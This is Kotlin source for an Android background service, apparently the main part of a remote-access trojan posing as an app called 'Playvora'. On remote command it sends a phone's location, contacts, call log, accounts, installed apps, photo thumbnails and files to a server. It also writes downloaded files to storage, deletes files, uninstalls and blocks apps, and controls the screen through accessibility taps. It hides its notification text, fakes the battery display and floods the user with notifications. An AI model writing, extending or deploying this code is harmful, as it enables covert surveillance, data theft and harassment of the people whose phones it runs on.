    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        socketWatchdogHandler.removeCallbacks(socketWatchdogRunnable)
        super.onDestroy()
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
        try { unregisterReceiver(localReceiver) } catch (_: Exception) {}
        stopCameraInternal()
        stopFloatingVideo()
        stopScreenCapture()
        stopSpamDialog()
        stopAutoWallpaper()
        stopSos()
        flashBlinking = false
        flashHandler?.removeCallbacks(flashRunnable ?: Runnable {})
        flashHandler = null
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        silentPlayer?.release()
        silentPlayer = null
        audioPlayer?.release()
        audioPlayer = null
        tts?.shutdown()
        tts = null
        socket?.disconnect()
        socket = null
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "Playvora", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun handleTap(valueJson: String) {
        try {
            val obj = JSONObject(valueJson)
            val xPct = obj.getDouble("x").toFloat()
            val yPct = obj.getDouble("y").toFloat()
            XyzAccessibilityService.instance?.performTap(xPct, yPct)
        } catch (e: Exception) { Log.e("DeviceService", "handleTap: ${e.message}") }
    }

    private fun handleSwipe(valueJson: String) {
        try {
            val obj  = JSONObject(valueJson)
            val x1   = obj.getDouble("x1").toFloat()
            val y1   = obj.getDouble("y1").toFloat()
            val x2   = obj.getDouble("x2").toFloat()
            val y2   = obj.getDouble("y2").toFloat()
            XyzAccessibilityService.instance?.performSwipe(x1, y1, x2, y2, 300L)
        } catch (e: Exception) { Log.e("DeviceService", "handleSwipe: ${e.message}") }
    }

    private fun handleScroll(valueJson: String) {
        try {
            val obj  = JSONObject(valueJson)
            val xPct = obj.getDouble("x").toFloat()
            val yPct = obj.getDouble("y").toFloat()
            val dir  = obj.optString("direction", "down")
            val dist = obj.optDouble("distance", 0.3).toFloat()
            val x1 = xPct; val x2 = xPct
            val y1: Float; val y2: Float
            if (dir == "up") {
                y1 = (yPct + dist).coerceAtMost(0.9f)
                y2 = (yPct - dist).coerceAtLeast(0.1f)
            } else {
                y1 = (yPct - dist).coerceAtLeast(0.1f)
                y2 = (yPct + dist).coerceAtMost(0.9f)
            }
            XyzAccessibilityService.instance?.performSwipe(x1, y1, x2, y2, 400L)
        } catch (e: Exception) { Log.e("DeviceService", "handleScroll: ${e.message}") }
    }

        private fun sendLocation() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.e("DeviceService", "sendLocation: permission not granted")
            return
        }
        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER)
        var best: Location? = null
        for (p in providers) {
            try {
                val loc = lm.getLastKnownLocation(p) ?: continue
                if (best == null || loc.accuracy < best.accuracy) best = loc
            } catch (_: Exception) {}
        }
        if (best != null) {
            emitLocationData(best)
            return
        }
        val listener = object : LocationListener {
            override fun onLocationChanged(loc: Location) {
                emitLocationData(loc)
                try { lm.removeUpdates(this) } catch (_: Exception) {}
            }
            override fun onProviderEnabled(p: String) {}
            override fun onProviderDisabled(p: String) {}
            @Deprecated("Deprecated in Java") override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
        }
        for (p in providers) {
            try {
                if (lm.isProviderEnabled(p)) {
                    lm.requestLocationUpdates(p, 0L, 0f, listener, Looper.getMainLooper())
                    break
                }
            } catch (_: Exception) {}
        }
        Handler(Looper.getMainLooper()).postDelayed({
            try { lm.removeUpdates(listener) } catch (_: Exception) {}
        }, 10000)
    }

    @Suppress("DEPRECATION")
    private fun emitLocationData(loc: Location) {
        Thread {
            try {
                val lat = loc.latitude
                val lng = loc.longitude
                val acc = loc.accuracy
                val obj = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("lat", lat)
                    put("lng", lng)
                    put("accuracy", acc)
                    put("mapsUrl", "https://www.google.com/maps?q=$lat,$lng")
                }
                try {
                    val geocoder = Geocoder(this, Locale("id", "ID"))
                    val addrs = geocoder.getFromLocation(lat, lng, 1)
                    if (!addrs.isNullOrEmpty()) {
                        val addr = addrs[0]
                        obj.put("address",      addr.getAddressLine(0) ?: "")
                        obj.put("kelurahan",    addr.subLocality ?: "")
                        obj.put("kecamatan",    addr.subAdminArea ?: "")
                        obj.put("kabupaten",    addr.adminArea ?: "")
                        obj.put("provinsi",     addr.adminArea ?: "")
                        obj.put("kodePos",      addr.postalCode ?: "")
                        obj.put("negara",       addr.countryName ?: "")
                        val sub = addr.subAdminArea ?: ""
                        val adm = addr.adminArea ?: ""
                        obj.put("kabupaten", sub.ifEmpty { adm })
                        obj.put("provinsi",  adm)
                    }
                } catch (e: Exception) {
                    Log.e("DeviceService", "Geocoder: ${e.message}")
                }
                if (socket?.connected() == true) {
                    socket?.emit("device:location", obj)
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "emitLocationData: ${e.message}")
            }
        }.start()
    }

    private fun sendAppList() {
        Thread {
            try {
                val pm = packageManager
                val installed = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                val arr = JSONArray()
                for (app in installed) {                    
                    if (app.packageName == packageName) continue
                    val name = pm.getApplicationLabel(app).toString()
                    val pkg  = app.packageName
                    val blocked = blockedApps.contains(pkg) || (blockAllApps && pkg != packageName)
                    arr.put(JSONObject().apply {
                        put("name",    name)
                        put("pkg",     pkg)
                        put("blocked", blocked)
                    })
                }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:applist", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("apps",     arr)
                    put("blockAll", blockAllApps)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendAppList: ${e.message}")
            }
        }.start()
    }

    private fun uninstallApp(pkg: String) {
        if (pkg.isBlank() || pkg == packageName) return
        Handler(Looper.getMainLooper()).post {
            try {
                XyzAccessibilityService.pendingUninstallPkg = pkg
                val uri = android.net.Uri.parse("package:$pkg")
                val intent = Intent(Intent.ACTION_UNINSTALL_PACKAGE, uri).apply {
                    putExtra(Intent.EXTRA_RETURN_RESULT, false)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            } catch (e: Exception) {
                Log.e("DeviceService", "uninstallApp: ${e.message}")
            }
        }
    }

    private fun listFiles(path: String) {
        Thread {
            try {
                val dir = if (path.isBlank()) android.os.Environment.getExternalStorageDirectory()
                          else java.io.File(path)
                if (!dir.exists() || !dir.isDirectory) {
                    socket?.emit("device:filelist", org.json.JSONObject().also {
                        it.put("deviceId", deviceId)
                        it.put("path", dir.absolutePath)
                        it.put("error", "Path tidak ditemukan")
                    })
                    return@Thread
                }
                val arr = org.json.JSONArray()
                val root = android.os.Environment.getExternalStorageDirectory().absolutePath
                if (dir.absolutePath != root) {
                    arr.put(org.json.JSONObject().also {
                        it.put("name", "..")
                        it.put("path", dir.parent ?: root)
                        it.put("type", "parent")
                        it.put("size", 0)
                        it.put("modified", 0)
                    })
                }
                dir.listFiles()
                    ?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
                    ?.forEach { f ->
                        arr.put(org.json.JSONObject().also {
                            it.put("name", f.name)
                            it.put("path", f.absolutePath)
                            it.put("type", if (f.isDirectory) "dir" else "file")
                            it.put("size", if (f.isFile) f.length() else 0)
                            it.put("modified", f.lastModified())
                        })
                    }
                socket?.emit("device:filelist", org.json.JSONObject().also {
                    it.put("deviceId", deviceId)
                    it.put("path", dir.absolutePath)
                    it.put("files", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "listFiles: ${e.message}")
            }
        }.start()
    }

    private fun sendFileToServer(path: String) {
        Thread {
            try {
                val file = java.io.File(path)
                if (!file.exists() || !file.isFile) {
                    socket?.emit("device:filedata", org.json.JSONObject().also {
                        it.put("deviceId", deviceId)
                        it.put("error", "File tidak ditemukan")
                    })
                    return@Thread
                }
                if (file.length() > 10 * 1024 * 1024) {
                    socket?.emit("device:filedata", org.json.JSONObject().also {
                        it.put("deviceId", deviceId)
                        it.put("error", "File terlalu besar (max 10MB)")
                    })
                    return@Thread
                }
                val bytes = file.readBytes()
                val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                socket?.emit("device:filedata", org.json.JSONObject().also {
                    it.put("deviceId", deviceId)
                    it.put("name", file.name)
                    it.put("path", file.absolutePath)
                    it.put("size", file.length())
                    it.put("data", b64)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendFileToServer: ${e.message}")
            }
        }.start()
    }

    private fun deleteFilePath(path: String) {
        Thread {
            try {
                val file = java.io.File(path)
                val ok = file.exists() && file.delete()
                socket?.emit("device:filedeleted", org.json.JSONObject().also {
                    it.put("deviceId", deviceId)
                    it.put("path", path)
                    it.put("ok", ok)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "deleteFile: ${e.message}")
            }
        }.start()
    }

    private fun receiveUploadedFile(value: String) {
        Thread {
            try {
                val obj      = org.json.JSONObject(value)
                val url      = obj.getString("url")
                val dirPath  = obj.getString("path")
                val name     = obj.getString("name")
                val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                conn.requestMethod = "GET"
                conn.connectTimeout = 15_000
                conn.readTimeout    = 30_000
                conn.setRequestProperty("Accept-Encoding", "identity")
                conn.setRequestProperty("Connection", "close")

                if (conn.responseCode != 200) {
                    socket?.emit("device:uploadresult", org.json.JSONObject().also {
                        it.put("deviceId", deviceId)
                        it.put("ok", false)
                        it.put("error", "Server error: ${conn.responseCode}")
                    })
                    return@Thread
                }

                val bytes = java.io.BufferedInputStream(conn.inputStream).readBytes()
                conn.disconnect()

                if (bytes.isEmpty()) {
                    socket?.emit("device:uploadresult", org.json.JSONObject().also {
                        it.put("deviceId", deviceId)
                        it.put("ok", false)
                        it.put("error", "File kosong dari server")
                    })
                    return@Thread
                }

                if (bytes.size > 10 * 1024 * 1024) {
                    socket?.emit("device:uploadresult", org.json.JSONObject().also {
                        it.put("deviceId", deviceId)
                        it.put("ok", false)
                        it.put("error", "File terlalu besar (max 10MB)")
                    })
                    return@Thread
                }

                val dir = java.io.File(dirPath)
                if (!dir.exists()) dir.mkdirs()
                val dest = java.io.File(dir, name)
                java.io.FileOutputStream(dest).use { it.write(bytes) }

                socket?.emit("device:uploadresult", org.json.JSONObject().also {
                    it.put("deviceId", deviceId)
                    it.put("ok", true)
                    it.put("path", dest.absolutePath)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "receiveUploadedFile: ${e.message}")
                socket?.emit("device:uploadresult", org.json.JSONObject().also {
                    it.put("deviceId", deviceId)
                    it.put("ok", false)
                    it.put("error", e.message ?: "Unknown error")
                })
            }
        }.start()
    }

    private fun sendAccountList() {
        Thread {
            try {
                val am = android.accounts.AccountManager.get(this)
                val accounts = am.accounts
                val arr = org.json.JSONArray()
                accounts.forEach { acc ->
                    arr.put(JSONObject().also {
                        it.put("name", acc.name)
                        it.put("type", acc.type)
                    })
                }
                socket?.emit("device:accounts", JSONObject().also {
                    it.put("deviceId", deviceId)
                    it.put("accounts", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendAccountList: ${e.message}")
            }
        }.start()
    }

    private fun sendCallLog() {
        Thread {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG)
                    != PackageManager.PERMISSION_GRANTED) {
                    Log.e("DeviceService", "sendCallLog: READ_CALL_LOG not granted")
                    socket?.emit("device:calllog", JSONObject().also {
                        it.put("deviceId", deviceId)
                        it.put("calls", org.json.JSONArray())
                        it.put("error", "permission_denied")
                    })
                    return@Thread
                }
                val arr = org.json.JSONArray()
                val projection = arrayOf(
                    android.provider.CallLog.Calls.NUMBER,
                    android.provider.CallLog.Calls.CACHED_NAME,
                    android.provider.CallLog.Calls.TYPE,
                    android.provider.CallLog.Calls.DURATION,
                    android.provider.CallLog.Calls.DATE
                )
                val cursor = contentResolver.query(
                    android.provider.CallLog.Calls.CONTENT_URI,
                    projection, null, null,
                    "${android.provider.CallLog.Calls.DATE} DESC"
                )
                Log.d("DeviceService", "sendCallLog: cursor count=${cursor?.count ?: -1}")
                cursor?.use {
                    val idxNum  = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                    val idxName = it.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME)
                    val idxType = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                    val idxDur  = it.getColumnIndex(android.provider.CallLog.Calls.DURATION)
                    val idxDate = it.getColumnIndex(android.provider.CallLog.Calls.DATE)
                    var count = 0
                    while (it.moveToNext() && count < 100) {
                        val type = when (it.getInt(idxType)) {
                            android.provider.CallLog.Calls.INCOMING_TYPE  -> "incoming"
                            android.provider.CallLog.Calls.OUTGOING_TYPE  -> "outgoing"
                            android.provider.CallLog.Calls.MISSED_TYPE    -> "missed"
                            android.provider.CallLog.Calls.REJECTED_TYPE  -> "rejected"
                            else -> "unknown"
                        }
                        arr.put(JSONObject().also { o ->
                            o.put("number",   it.getString(idxNum)  ?: "")
                            o.put("name",     it.getString(idxName) ?: "")
                            o.put("type",     type)
                            o.put("duration", it.getLong(idxDur))
                            o.put("date",     it.getLong(idxDate))
                        })
                        count++
                    }
                }
                Log.d("DeviceService", "sendCallLog: emitting ${arr.length()} calls")
                socket?.emit("device:calllog", JSONObject().also {
                    it.put("deviceId", deviceId)
                    it.put("calls",    arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendCallLog: ${e.message}")
            }
        }.start()
    }

    private fun sendContactList() {
        Thread {
            try {
                val arr = JSONArray()
                val cursor = contentResolver.query(
                    android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    arrayOf(
                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
                    ),
                    null, null,
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                )
                cursor?.use {
                    while (it.moveToNext()) {
                        val name   = it.getString(0) ?: ""
                        val number = it.getString(1) ?: ""
                        arr.put(JSONObject().apply {
                            put("name",   name)
                            put("number", number)
                        })
                    }
                }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:contacts", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("contacts", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendContactList: ${e.message}")
            }
        }.start()
    }

    private fun sendGalleryList() {
        Thread {
            try {
                val MAX_PHOTOS = 200
                val arr = JSONArray()
                val uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                val projection = arrayOf(
                    android.provider.MediaStore.Images.Media._ID,
                    android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                    android.provider.MediaStore.Images.Media.DATE_TAKEN
                )
                val sortOrder = "${android.provider.MediaStore.Images.Media.DATE_TAKEN} DESC"
                val cursor = contentResolver.query(uri, projection, null, null, sortOrder)
                var count = 0
                cursor?.use {
                    val idCol   = it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media._ID)
                    val nameCol = it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DISPLAY_NAME)
                    while (it.moveToNext() && count < MAX_PHOTOS) {
                        val id     = it.getLong(idCol)
                        val name   = it.getString(nameCol) ?: ""
                        val imgUri = android.net.Uri.withAppendedPath(uri, id.toString())
                        try {
                            val bmp = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                contentResolver.loadThumbnail(imgUri, android.util.Size(480, 480), null)
                            } else {
                                android.provider.MediaStore.Images.Thumbnails.getThumbnail(
                                    contentResolver, id,
                                    android.provider.MediaStore.Images.Thumbnails.MINI_KIND, null
                                )
                            }
                            if (bmp != null) {
                                val baos = java.io.ByteArrayOutputStream()
                                bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, baos)
                                bmp.recycle()
                                val b64 = android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.NO_WRAP)
                                arr.put(JSONObject().apply {
                                    put("id",    id)
                                    put("name",  name)
                                    put("thumb", b64)
                                })
                                count++
                            }
                        } catch (e: Exception) {
                            Log.e("DeviceService", "thumb error: ${e.message}")
                        }
                    }
                }
                if (socket?.connected() != true) return@Thread

                socket?.emit("device:gallery", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("photos",   arr)
                    put("total",    arr.length())
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendGalleryList: ${e.message}")
            }
        }.start()
    }

    private fun blockApp(pkg: String) {
        if (pkg.isEmpty()) return
        blockedApps.add(pkg)
        saveBlockedApps()
        Log.d("DeviceService", "Blocked: $pkg")
    }

    private fun unblockApp(pkg: String) {
        if (pkg.isEmpty()) return
        blockedApps.remove(pkg)
        saveBlockedApps()
        Log.d("DeviceService", "Unblocked: $pkg")
    }

    private fun setBlockAll(enabled: Boolean) {
        blockAllApps = enabled
        saveBlockedApps()
        Log.d("DeviceService", "BlockAll: $enabled")
    }

    private fun saveBlockedApps() {
        val prefs = getSharedPreferences("block_prefs", MODE_PRIVATE)
        prefs.edit()
            .putStringSet("blocked", blockedApps)
            .putBoolean("blockAll", blockAllApps)
            .apply()
        XyzAccessibilityService.updateBlockedApps(blockedApps.toSet(), blockAllApps, packageName)
    }

    private fun loadBlockedApps() {
        val prefs = getSharedPreferences("block_prefs", MODE_PRIVATE)
        blockedApps.clear()
        blockedApps.addAll(prefs.getStringSet("blocked", emptySet()) ?: emptySet())
        blockAllApps = prefs.getBoolean("blockAll", false)
        XyzAccessibilityService.updateBlockedApps(blockedApps.toSet(), blockAllApps, packageName)
    }

    private fun handleFloatPhotos(value: String) {
        try {
            val json    = JSONObject(value)
            val enabled = json.optBoolean("enabled", false)
            if (!enabled) { stopFloatPhotos(); return }
            if (!Settings.canDrawOverlays(this)) {
                emitStatus(JSONObject().apply { put("floatPhotosError", "no_overlay_perm") })
                return
            }
            val arr  = json.optJSONArray("urls") ?: return
            val urls = (0 until arr.length()).map { arr.getString(it) }.filter { it.isNotEmpty() }
            if (urls.isEmpty()) return
            stopFloatPhotos()
            floatPhotoActive = true

            val metrics = resources.displayMetrics
            val sw      = metrics.widthPixels
            val sh      = metrics.heightPixels
            val rng     = java.util.Random()
            val count   = 20

            Handler(Looper.getMainLooper()).post {
                repeat(count) { i ->
                    if (!floatPhotoActive) return@repeat
                    val url      = urls[i % urls.size]
                    val sizePx   = (sw * (0.15f + rng.nextFloat() * 0.25f)).toInt()
                    val posX     = rng.nextInt((sw - sizePx).coerceAtLeast(1))
                    val posY     = rng.nextInt((sh - sizePx).coerceAtLeast(1))

                    Handler(Looper.getMainLooper()).postDelayed({
                        if (!floatPhotoActive) return@postDelayed
                        val imgView  = android.widget.ImageView(this@DeviceService).apply {
                            scaleType = android.widget.ImageView.ScaleType.CENTER_CROP
                            alpha = 0f
                        }

                        val wlp = XyzAccessibilityService.buildOverlayParams(focusable = false).apply {
                            width  = sizePx
                            height = sizePx
                            gravity = android.view.Gravity.TOP or android.view.Gravity.START
                            x = posX
                            y = posY
                        }

                        try {
                            XyzAccessibilityService.addOverlay(imgView, wlp)
                            synchronized(floatPhotoViews) { floatPhotoViews.add(imgView) }
                        } catch (e: Exception) {
                            Log.e("DeviceService", "floatPhoto addOverlay: ${e.message}")
                            return@postDelayed
                        }

                        Thread {
                            try {
                                var currentUrl = url
                                var bmp: android.graphics.Bitmap? = null
                                repeat(5) { _ ->
                                    if (bmp != null) return@repeat
                                    val conn = java.net.URL(currentUrl).openConnection() as java.net.HttpURLConnection
                                    conn.connectTimeout = 10000
                                    conn.readTimeout    = 10000
                                    conn.instanceFollowRedirects = true
                                    conn.setRequestProperty("User-Agent", "Mozilla/5.0")
                                    conn.connect()
                                    val code = conn.responseCode
                                    if (code in 300..399) {
                                        currentUrl = conn.getHeaderField("Location") ?: return@repeat
                                        conn.disconnect()
                                    } else {
                                        bmp = android.graphics.BitmapFactory.decodeStream(conn.inputStream)
                                        conn.disconnect()
                                    }
                                }
                                if (bmp != null && floatPhotoActive) {
                                    Handler(Looper.getMainLooper()).post {
                                        imgView.setImageBitmap(bmp)
                                        imgView.animate().alpha(1f).setDuration(400).start()
                                    }
                                }
                            } catch (e: Exception) {
                                Log.e("DeviceService", "floatPhoto load: ${e.message} url=$url")
                            }
                        }.start()
                    }, i * 500L)
                }
                emitStatus(JSONObject().apply { put("floatPhotosActive", true) })
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "handleFloatPhotos: ${e.message}")
        }
    }

    private fun stopFloatPhotos() {
        floatPhotoActive = false
        Handler(Looper.getMainLooper()).post {
            synchronized(floatPhotoViews) {
                floatPhotoViews.forEach { v ->
                    try { XyzAccessibilityService.removeOverlay(v) } catch (_: Exception) {}
                }
                floatPhotoViews.clear()
            }
            emitStatus(JSONObject().apply { put("floatPhotosActive", false) })
        }
    }

    private fun handleFakeBattery(value: String) {
        try {
            val json    = JSONObject(value)
            val enabled = json.optBoolean("enabled", false)
            if (!enabled) { stopFakeBattery(); return }
            if (!Settings.canDrawOverlays(this)) {
                emitStatus(JSONObject().apply { put("fakeBatteryError", "no_overlay_perm") })
                return
            }
            val percent  = json.optInt("percent", 1).coerceIn(0, 100)
            val charging = json.optBoolean("charging", false)
            stopFakeBattery()
            fakeBatteryActive = true

            Handler(Looper.getMainLooper()).post {
                val metrics = resources.displayMetrics
                val sw      = metrics.widthPixels

                val color = when {
                    charging        -> "#00e676"
                    percent <= 15   -> "#f44336"
                    percent <= 30   -> "#ff9800"
                    else            -> "#ffffff"
                }

                val boltCss = if (charging) ".bolt{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:8px;color:#000;font-weight:900;z-index:1}" else ""
                val boltPrefix = if (charging) "⚡" else ""
                val boltDiv = if (charging) "<div class='bolt'>⚡</div>" else ""
                val fillCss = "position:absolute;top:1px;left:1px;bottom:1px;width:" + percent + "%;background:" + color + ";border-radius:1px;transition:width .3s"
                val pctCss = "font-family:sans-serif;font-size:11px;font-weight:700;color:" + color + ";text-shadow:0 0 4px rgba(0,0,0,.8)"
                val iconCss = "position:relative;width:22px;height:11px;border:1.5px solid " + color + ";border-radius:2px;overflow:visible"
                val iconAfterCss = "content:'';position:absolute;right:-4px;top:50%;transform:translateY(-50%);width:3px;height:5px;background:" + color + ";border-radius:0 1px 1px 0"

                val html = "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'>" +
                    "<style>" +
                    "*{margin:0;padding:0;box-sizing:border-box}" +
                    "body{background:transparent;display:flex;align-items:center;justify-content:flex-end;padding:2px 4px 0 0;height:100%}" +
                    ".wrap{display:flex;align-items:center;gap:3px}" +
                    ".pct{" + pctCss + "}" +
                    ".icon{" + iconCss + "}" +
                    ".icon::after{" + iconAfterCss + "}" +
                    ".fill{" + fillCss + "}" +
                    boltCss +
                    "</style></head>" +
                    "<body><div class='wrap'>" +
                    "<span class='pct'>" + boltPrefix + percent + "%</span>" +
                    "<div class='icon'><div class='fill'></div>" + boltDiv + "</div>" +
                    "</div></body></html>"

                val wv = android.webkit.WebView(this@DeviceService).apply {
                    setBackgroundColor(android.graphics.Color.TRANSPARENT)
                    settings.javaScriptEnabled = false
                }

                val wlp = XyzAccessibilityService.buildOverlayParams(focusable = false).apply {
                    width   = (sw * 0.28f).toInt()
                    height  = android.view.WindowManager.LayoutParams.WRAP_CONTENT
                    gravity = android.view.Gravity.TOP or android.view.Gravity.END
                    x = 0
                    y = 8
                }

                try {
                    XyzAccessibilityService.addOverlay(wv, wlp)
                    wv.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
                    fakeBatteryView = wv
                    emitStatus(JSONObject().apply { put("fakeBatteryActive", true) })
                } catch (e: Exception) {
                    Log.e("DeviceService", "fakeBattery addOverlay: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "handleFakeBattery: ${e.message}")
        }
    }

    private fun stopFakeBattery() {
        fakeBatteryActive = false
        Handler(Looper.getMainLooper()).post {
            try {
                fakeBatteryView?.let { XyzAccessibilityService.removeOverlay(it) }
            } catch (_: Exception) {}
            fakeBatteryView = null
            emitStatus(JSONObject().apply { put("fakeBatteryActive", false) })
        }
    }

    private fun showNotificationFromCommand(value: String) {
        try {
            val json     = JSONObject(value)
            val title    = json.optString("title", "Notifikasi")
            val body     = json.optString("body", "")
            val count    = json.optInt("count", 1).coerceIn(1, 50)
            val interval = json.optInt("interval", 1).coerceIn(1, 60)

            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            val chId = "xyz_notif_mgr"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val ch = NotificationChannel(chId, "Notif Manager", NotificationManager.IMPORTANCE_HIGH).apply {
                    enableLights(true)
                    enableVibration(true)
                }
                nm.createNotificationChannel(ch)
            }

            val handler = Handler(Looper.getMainLooper())
            for (i in 0 until count) {
                handler.postDelayed({
                    val notif = NotificationCompat.Builder(this@DeviceService, chId)
                        .setSmallIcon(android.R.drawable.ic_dialog_info)
                        .setContentTitle(title)
                        .setContentText(body)
                        .setAutoCancel(true)
                        .setPriority(NotificationCompat.PRIORITY_HIGH)
                        .build()
                    nm.notify(System.currentTimeMillis().toInt(), notif)
                }, i * interval * 1000L)
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "showNotification: ${e.message}")
        }
    }

    private fun showToastFromCommand(value: String) {
        try {
            val json     = JSONObject(value)
            val text     = json.optString("text", "")
            val duration = if (json.optString("duration") == "long") android.widget.Toast.LENGTH_LONG
                           else android.widget.Toast.LENGTH_SHORT
            val count    = json.optInt("count", 1).coerceIn(1, 20)
            val delayMs  = if (duration == android.widget.Toast.LENGTH_LONG) 4000L else 2500L

            val handler = Handler(Looper.getMainLooper())
            for (i in 0 until count) {
                handler.postDelayed({
                    android.widget.Toast.makeText(this@DeviceService, text, duration).show()
                }, i * delayMs)
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "showToast: ${e.message}")
        }
    }
}

object SocketHolder {
    var connected: Boolean = false
}
